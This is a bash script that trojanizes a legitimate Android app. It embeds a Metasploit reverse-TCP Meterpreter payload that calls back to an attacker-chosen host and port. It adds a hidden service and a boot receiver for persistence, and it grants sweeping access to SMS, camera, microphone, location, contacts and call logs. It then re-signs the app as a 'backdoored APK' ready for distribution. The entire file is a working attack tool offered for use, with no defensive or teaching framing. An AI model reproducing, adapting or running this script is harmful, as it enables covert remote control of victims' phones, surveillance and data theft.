#!/bin/bash

echo "=========================================="
echo " Android Ultimate Injector (Stealth, Background, Persistence)"
echo " Created by Layek Automation"
echo "=========================================="

# Checking required tools
echo "[*] Checking dependencies..."
DEPENDENCIES=(apktool msfvenom apksigner keytool zipalign)

for pkg in "${DEPENDENCIES[@]}"; do
    if ! command -v $pkg &> /dev/null; then
        echo "[!] $pkg not found. Installing..."
        sudo apt update && sudo apt install -y $pkg
    else
        echo "[+] $pkg is already installed."
    fi
done

# Original APK path
read -p "[+] Enter the path to the original APK: " ORIGINAL_APK
if [ ! -f "$ORIGINAL_APK" ]; then
    echo "[-] Original APK not found!"
    exit 1
fi

# Final APK name
read -p "[+] Enter name for the backdoored APK (without .apk): " FINAL_NAME

# LHOST & LPORT
read -p "[+] Enter your LHOST (your IP or ngrok addr): " LHOST
read -p "[+] Enter your LPORT (your listening port): " LPORT

# Generate Meterpreter payload
echo "[*] Generating Meterpreter payload..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o payload.apk

# Decompile APKs
apktool d "$ORIGINAL_APK" -o original_src
apktool d payload.apk -o payload_src

# Copy payload smali
cp -r payload_src/smali/com/metasploit original_src/smali/com/

# Create stealth service that starts payload service
mkdir -p original_src/smali/com/stealth

cat > original_src/smali/com/stealth/StealthService.smali <<'EOF'
.class public Lcom/stealth/StealthService;
.super Landroid/app/Service;

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/metasploit/stage/MainService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    const/4 v0, 1
    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public onCreate()V
    .locals 0
    invoke-super {p0}, Landroid/app/Service;->onCreate()V
    return-void
.end method
EOF

cat > original_src/smali/com/stealth/BootReceiver.smali <<'EOF'
.class public Lcom/stealth/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/stealth/StealthService;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method
EOF

# Inject permissions into AndroidManifest.xml
MANIFEST="original_src/AndroidManifest.xml"
echo "[*] Injecting permissions and services into AndroidManifest.xml..."

sed -i '/<manifest/a\
<uses-permission android:name="android.permission.INTERNET"/>\ 
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\ 
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>\ 
<uses-permission android:name="android.permission.READ_SMS"/>\ 
<uses-permission android:name="android.permission.SEND_SMS"/>\ 
<uses-permission android:name="android.permission.RECORD_AUDIO"/>\ 
<uses-permission android:name="android.permission.CAMERA"/>\ 
<uses-permission android:name="android.permission.READ_CONTACTS"/>\ 
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\ 
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\ 
<uses-permission android:name="android.permission.READ_CALL_LOG"/>\ 
<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\ 
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>\ 
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\ 
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>\ 
<uses-permission android:name="android.permission.GET_TASKS"/>\ 
<uses-permission android:name="android.permission.WAKE_LOCK"/>\ 
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>\ 
<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>' "$MANIFEST"

# Add service and receiver
sed -i '/<application/a\
<service android:name="com.stealth.StealthService" android:enabled="true" android:exported="false"/>\n\
<receiver android:name="com.stealth.BootReceiver" android:enabled="true" android:exported="false">\n\
<intent-filter>\n\
<action android:name="android.intent.action.BOOT_COMPLETED"/>\n\
</intent-filter>\n\
</receiver>' "$MANIFEST"

# Inject startService into MainActivity
echo "[*] Injecting stealth service into MainActivity..."
MAIN_ACTIVITY_PATH=$(grep -rl ".method.*onCreate(Landroid/os/Bundle;)V" original_src/smali | head -n 1)
if [ -n "$MAIN_ACTIVITY_PATH" ]; then
    awk '
    /invoke-super {p0, p1}/ {
        print;
        print "    new-instance v1, Landroid/content/Intent;";
        print "    const-class v0, Lcom/stealth/StealthService;";
        print "    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V";
        print "    invoke-virtual {p0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;";
        next
    } 1' "$MAIN_ACTIVITY_PATH" > temp.smali && mv temp.smali "$MAIN_ACTIVITY_PATH"
else
    echo "[-] Could not locate MainActivity with onCreate method."
    exit 1
fi

# Rebuild
apktool b original_src -o ${FINAL_NAME}_unsigned.apk

# Align
zipalign -v 4 ${FINAL_NAME}_unsigned.apk ${FINAL_NAME}_aligned.apk

# Keystore
KEYSTORE="my-release-key.keystore"
if [ -f "$KEYSTORE" ]; then
    if [ ! -s "$KEYSTORE" ]; then
        echo "[!] Empty/corrupted keystore. Deleting..."
        rm -f "$KEYSTORE"
    else
        keytool -list -keystore "$KEYSTORE" -storepass layek123 &>/dev/null || rm -f "$KEYSTORE"
    fi
fi

if [ ! -f "$KEYSTORE" ]; then
    echo "[*] Creating keystore..."
    keytool -genkeypair -v -keystore "$KEYSTORE" -alias myalias \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -storetype JKS \
        -storepass layek123 -keypass layek123 \
        -dname "CN=Muddassirul, OU=LayekSec, O=LayekOrg, L=Dhaka, ST=BD, C=BD"
fi

# Sign APK
echo "[*] Signing APK..."
apksigner sign --ks "$KEYSTORE" --ks-key-alias myalias \
  --ks-pass pass:layek123 --key-pass pass:layek123 "${FINAL_NAME}_aligned.apk"

if [ $? -ne 0 ]; then
    echo "[-] APK signing failed!"
    exit 1
fi

echo "[+] APK signing complete: ${FINAL_NAME}_aligned.apk"

# Cleanup
rm -rf payload.apk payload_src original_src "${FINAL_NAME}_unsigned.apk"

echo "[+] Done! Backdoored APK is ready: ${FINAL_NAME}_aligned.apk"
